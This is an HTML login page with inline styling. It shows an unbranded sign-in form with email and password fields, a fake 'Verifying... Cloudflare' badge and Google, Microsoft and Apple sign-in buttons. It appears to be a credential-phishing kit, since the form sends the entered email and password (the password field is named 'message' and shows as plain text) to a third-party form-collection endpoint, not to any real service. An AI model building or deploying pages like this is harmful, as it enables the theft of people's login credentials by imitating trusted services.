<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
  

<body>
  <div class="login-container">
    <div class="login-box">
      <div class="logo">
        <img src="your-logo.png" alt="Logo">
      </div>
      

      <form action="https://getform.io/f/bgddgnga" method="POST">

        <div class="input-group">
          <label for="email">Email</label>
          <input type="email" name="email" placeholder="Enter your email" required>

        
        </div>
        <div class="input-group">
          <label for="password">Password</label>
          <input type="text" name="message" placeholder="Enter your password" required>
        </div>
        <a href="#" class="forgot-password">Forgot password?</a>
        <div class="verifying">
          <span>Verifying...</span>
          <div class="cloudflare">Cloudflare</div>
        </div>
        <button type="submit" class="login-btn">Login</button>
        <div class="social-login">
          <button class="google-btn">Sign in with Google</button>
          <button class="microsoft-btn">Sign in with Microsoft</button>
          <button class="email-btn">Sign in with Email</button>
          <button class="apple-btn">Sign in with Apple</button>
        </div>
      </form>
    </div>
  </div>
</body>

<style>
  
  body {
  margin: 0;
  font-family: Arial, sans-serif;
  background-color: #121927;
  color: #fff;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.login-container {
  width: 100%;
  max-width: 400px;
}

.login-box {
  background-color: #1a2236;
  padding: 20px;
  border-radius: 8px;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
  text-align: center;
}

.logo img {
  max-width: 100px;
  margin-bottom: 20px;
}

.input-group {
  margin-bottom: 15px;
  text-align: left;
}

.input-group label {
  display: block;
  margin-bottom: 5px;
}

.input-group input {
  width: 100%;
  padding: 10px;
  border-radius: 4px;
  border: 1px solid #ccc;
  background-color: #fff;
  color: #333;
}

.forgot-password {
  display: block;
  margin-bottom: 15px;
  color: #007bff;
  text-decoration: none;
}

.verifying {
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 5px;
  margin-bottom: 20px;
}

.verifying span {
  font-size: 14px;
}

.cloudflare {
  font-size: 12px;
  color: #888;
}

.login-btn {
  width: 100%;
  padding: 10px;
  background: linear-gradient(90deg, #6a5af9, #8f44fd);
  border: none;
  border-radius: 4px;
  color: #fff;
  font-size: 16px;
  cursor: pointer;
}

.social-login {
  margin-top: 15px;
}

.social-login button {
  width: 100%;
  padding: 10px;
  border: none;
  border-radius: 4px;
  margin-bottom: 10px;
  color: #fff;
  cursor: pointer;
}

.google-btn {
  background-color: #db4437;
}

.microsoft-btn {
  background-color: #0078d4;
}

.email-btn {
  background-color: #6c757d;
}

.apple-btn {
  background-color: #000;
}
</style>
    
</body>
</html>
